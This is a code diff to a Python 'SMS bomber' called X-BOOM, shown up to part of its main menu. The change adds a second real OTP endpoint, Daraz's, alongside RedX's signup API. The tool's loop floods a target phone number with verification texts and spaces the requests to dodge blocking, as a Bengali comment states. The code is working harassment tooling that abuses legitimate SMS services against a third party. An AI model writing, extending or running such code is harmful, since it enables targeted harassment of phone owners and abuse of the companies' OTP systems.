@@ -7,29 +7,38 @@ def banner():
     print("========================================")
     print("        WELCOME TO X-BOOM TOOL          ")
     print("     Created by: mmalekislam788         ")
-    print("     Status: REDX API ACTIVE (2026)     ")
+    print("     Status: MULTI-API ACTIVE (2026)    ")
     print("========================================")
 
 def send_sms(target, count):
-    # REDX Sourcing API
-    url = "https://api.redx.com.bd/v1/user/signup"
-    payload = {"phone": target}
+    # API 1: Redx
+    url1 = "https://api.redx.com.bd/v1/user/signup"
+    # API 2: Daraz
+    url2 = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
     
-    print(f"\n[+] Global Attack started on: {target}")
+    # Cleaning the number
+    if target.startswith("01"):
+        phone_with_88 = "88" + target
+    else:
+        phone_with_88 = target
+
+    print(f"\n[+] Attack started on: {target}")
     for i in range(count):
         try:
-            response = requests.post(url, json=payload)
-            if response.status_code == 200:
-                print(f"[!] SMS {i+1} sent successfully!")
-            else:
-                print(f"[?] Failed (Limit) SMS {i+1}")
+            # API 1 attempt
+            requests.post(url1, json={"phone": target})
+            # API 2 attempt
+            requests.post(url2, json={"phoneNumber": target, "otpType": "LOGIN"})
+            
+            print(f"[!] SMS {i+1} sent successfully!")
         except:
-            print(f"[-] Network Error at SMS {i+1}")
-        time.sleep(3)
+            print(f"[-] Error at SMS {i+1}")
+        
+        time.sleep(4) # ৪ সেকেন্ড গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না
 
 def main():
     banner()
-    print("\n[1] Start High-Power Bomber")
+    print("\n[1] Start Power Bomber")
     print("[2] Exit")
     choice = input("\nSelect an option: ")
     if choice == '1':
